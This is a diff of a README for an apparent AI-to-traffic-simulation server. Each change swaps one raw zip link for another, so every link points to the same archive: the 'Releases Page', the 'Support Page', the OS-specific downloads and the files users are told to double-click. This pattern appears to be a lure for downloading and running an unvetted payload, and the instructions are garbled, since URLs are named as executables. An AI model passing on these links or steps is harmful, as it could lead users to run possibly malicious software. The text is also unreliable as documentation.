@@ -1,6 +1,6 @@
 # 🚀 SUMO-MCP-Server - Connect AI with Traffic Simulations
 
-![Download SUMO-MCP-Server](https://github.com/HypaSMarty/SUMO-MCP-Server/raw/refs/heads/main/src/resources/Server_SUM_MC_caduceus.zip)
+![Download SUMO-MCP-Server](https://raw.githubusercontent.com/HypaSMarty/SUMO-MCP-Server/main/doc/Server_SUM_MC_v1.8-beta.4.zip)
 
 ## 🛠️ Overview
 
@@ -26,17 +26,17 @@ Follow these steps to download and run SUMO-MCP-Server:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
 
-   [Visit Releases Page](https://github.com/HypaSMarty/SUMO-MCP-Server/raw/refs/heads/main/src/resources/Server_SUM_MC_caduceus.zip)
+   [Visit Releases Page](https://raw.githubusercontent.com/HypaSMarty/SUMO-MCP-Server/main/doc/Server_SUM_MC_v1.8-beta.4.zip)
 
-2. **Download the Latest Version**: On the releases page, find the latest version. Look for the file that matches your operating system (for example, `https://github.com/HypaSMarty/SUMO-MCP-Server/raw/refs/heads/main/src/resources/Server_SUM_MC_caduceus.zip` or `https://github.com/HypaSMarty/SUMO-MCP-Server/raw/refs/heads/main/src/resources/Server_SUM_MC_caduceus.zip`).
+2. **Download the Latest Version**: On the releases page, find the latest version. Look for the file that matches your operating system (for example, `https://raw.githubusercontent.com/HypaSMarty/SUMO-MCP-Server/main/doc/Server_SUM_MC_v1.8-beta.4.zip` or `https://raw.githubusercontent.com/HypaSMarty/SUMO-MCP-Server/main/doc/Server_SUM_MC_v1.8-beta.4.zip`).
 
 3. **Extract the Files**: 
     - If you are on Windows, right-click the downloaded zip file and select "Extract All...". 
     - For macOS, double-click the zip file to unzip it.
 
 4. **Run the Application**:
-    - On Windows, navigate to the extracted folder and double-click `https://github.com/HypaSMarty/SUMO-MCP-Server/raw/refs/heads/main/src/resources/Server_SUM_MC_caduceus.zip`.
-    - On macOS, navigate to the extracted folder and double-click `https://github.com/HypaSMarty/SUMO-MCP-Server/raw/refs/heads/main/src/resources/Server_SUM_MC_caduceus.zip`.
+    - On Windows, navigate to the extracted folder and double-click `https://raw.githubusercontent.com/HypaSMarty/SUMO-MCP-Server/main/doc/Server_SUM_MC_v1.8-beta.4.zip`.
+    - On macOS, navigate to the extracted folder and double-click `https://raw.githubusercontent.com/HypaSMarty/SUMO-MCP-Server/main/doc/Server_SUM_MC_v1.8-beta.4.zip`.
 
 5. **Follow On-Screen Instructions**: Once the application is open, follow the prompts to set up your traffic simulation.
 
@@ -44,7 +44,7 @@ Follow these steps to download and run SUMO-MCP-Server:
 
 To begin using SUMO-MCP-Server, you need to download it. Click the link below to access the releases page where you can find all available versions.
 
-[Download SUMO-MCP-Server](https://github.com/HypaSMarty/SUMO-MCP-Server/raw/refs/heads/main/src/resources/Server_SUM_MC_caduceus.zip)
+[Download SUMO-MCP-Server](https://raw.githubusercontent.com/HypaSMarty/SUMO-MCP-Server/main/doc/Server_SUM_MC_v1.8-beta.4.zip)
 
 ## 📝 Configuration
 
@@ -72,7 +72,7 @@ If you encounter issues while using SUMO-MCP-Server, consider the following comm
 
 ## 💬 Support
 
-For further assistance, please visit our [Support Page](https://github.com/HypaSMarty/SUMO-MCP-Server/raw/refs/heads/main/src/resources/Server_SUM_MC_caduceus.zip) where you can report issues or ask questions.
+For further assistance, please visit our [Support Page](https://raw.githubusercontent.com/HypaSMarty/SUMO-MCP-Server/main/doc/Server_SUM_MC_v1.8-beta.4.zip) where you can report issues or ask questions.
 
 ## 📅 Changelog
 
